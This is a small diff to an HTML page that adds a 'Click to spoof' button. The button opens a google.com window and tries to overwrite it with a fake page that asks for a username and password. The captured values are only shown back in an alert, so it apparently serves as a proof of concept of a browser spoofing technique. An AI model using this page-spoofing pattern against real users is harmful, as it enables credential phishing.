@@ -20,6 +20,14 @@
 	<button onclick="openPopup()">Delay Open Popup</button>
 
 <a href="https://linktr.ee/khaily" target="_blank">Open Example.com</a>
+
+
+<button onclick="spoof()">Click to spoof</button> 
+	<script> function spoof() { 
+	let win = window.open("https://www.google.com/csi", "_blank"); 
+	setTimeout(() => { 
+		try { win.document.write(` <h1>This is not Google!</h1> <button onclick=" let username = prompt('Enter your username'); let password = prompt('Enter your password'); alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password); ">Click me</button> `); win.document.close(); } catch (e) { console.warn("Blocked by browser protections:", e); } }, 50); } </script>
+
 	
 <div id="message"></div>
 
